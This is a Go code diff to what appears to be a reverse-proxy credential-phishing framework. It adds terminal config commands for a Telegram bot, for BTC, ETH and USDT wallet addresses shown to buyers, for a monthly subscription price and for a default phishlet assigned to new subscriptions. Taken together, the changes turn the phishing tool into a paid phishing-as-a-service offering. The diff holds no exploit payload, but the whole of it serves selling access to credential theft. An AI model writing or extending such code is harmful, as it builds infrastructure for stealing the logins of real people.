@@ -269,6 +269,56 @@ func (t *Terminal) handleConfig(args []string) error {
 			}
 			t.cfg.SetAdminPassword(args[1])
 			return nil
+		case "bot_token":
+			t.cfg.general.BotToken = strings.TrimSpace(args[1])
+			t.cfg.cfg.Set(CFG_GENERAL, t.cfg.general)
+			t.cfg.cfg.WriteConfig()
+			log.Info("bot_token set (restart required to activate bot)")
+			return nil
+		case "bot_admin_chat_id":
+			id, err := strconv.ParseInt(strings.TrimSpace(args[1]), 10, 64)
+			if err != nil {
+				return fmt.Errorf("invalid chat id: %v", err)
+			}
+			t.cfg.general.BotAdminChatId = id
+			t.cfg.cfg.Set(CFG_GENERAL, t.cfg.general)
+			t.cfg.cfg.WriteConfig()
+			log.Info("bot admin chat id set to: %d", id)
+			return nil
+		case "crypto_btc":
+			t.cfg.general.CryptoBTC = strings.TrimSpace(args[1])
+			t.cfg.cfg.Set(CFG_GENERAL, t.cfg.general)
+			t.cfg.cfg.WriteConfig()
+			log.Info("BTC wallet set")
+			return nil
+		case "crypto_eth":
+			t.cfg.general.CryptoETH = strings.TrimSpace(args[1])
+			t.cfg.cfg.Set(CFG_GENERAL, t.cfg.general)
+			t.cfg.cfg.WriteConfig()
+			log.Info("ETH wallet set")
+			return nil
+		case "crypto_usdt":
+			t.cfg.general.CryptoUSDT = strings.TrimSpace(args[1])
+			t.cfg.cfg.Set(CFG_GENERAL, t.cfg.general)
+			t.cfg.cfg.WriteConfig()
+			log.Info("USDT wallet set")
+			return nil
+		case "sub_price":
+			p, err := strconv.Atoi(strings.TrimSpace(args[1]))
+			if err != nil || p <= 0 {
+				return fmt.Errorf("invalid price")
+			}
+			t.cfg.general.SubPrice = p
+			t.cfg.cfg.Set(CFG_GENERAL, t.cfg.general)
+			t.cfg.cfg.WriteConfig()
+			log.Info("subscription price set to $%d/month", p)
+			return nil
+		case "default_phishlet":
+			t.cfg.general.DefaultPhishlet = strings.TrimSpace(args[1])
+			t.cfg.cfg.Set(CFG_GENERAL, t.cfg.general)
+			t.cfg.cfg.WriteConfig()
+			log.Info("default phishlet set to: %s", args[1])
+			return nil
 		case "autocert":
 			switch args[1] {
 			case "on":
@@ -1560,6 +1610,13 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
 	h.AddSubCommand("config", []string{"default_redirect"}, "default_redirect <url>", "set the default redirect URL applied to every new lure on creation")
 	h.AddSubCommand("config", []string{"admin_password"}, "admin_password <password>", "set the admin panel password (panel at /admin/panel)")
+	h.AddSubCommand("config", []string{"bot_token"}, "bot_token <token>", "set the Telegram bot token (from @BotFather) — restart required")
+	h.AddSubCommand("config", []string{"bot_admin_chat_id"}, "bot_admin_chat_id <id>", "set your Telegram chat ID as the bot admin (get it from @userinfobot)")
+	h.AddSubCommand("config", []string{"crypto_btc"}, "crypto_btc <address>", "set BTC wallet address shown to buyers")
+	h.AddSubCommand("config", []string{"crypto_eth"}, "crypto_eth <address>", "set ETH wallet address shown to buyers")
+	h.AddSubCommand("config", []string{"crypto_usdt"}, "crypto_usdt <address>", "set USDT (TRC20) wallet address shown to buyers")
+	h.AddSubCommand("config", []string{"sub_price"}, "sub_price <usd>", "set subscription price in USD per month (default: 150)")
+	h.AddSubCommand("config", []string{"default_phishlet"}, "default_phishlet <name>", "set the default phishlet assigned to new subscriptions")
 	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
 	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "set up the admin url of a gophish instance to communicate with (e.g. https://gophish.domain.com:7777)")
 	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
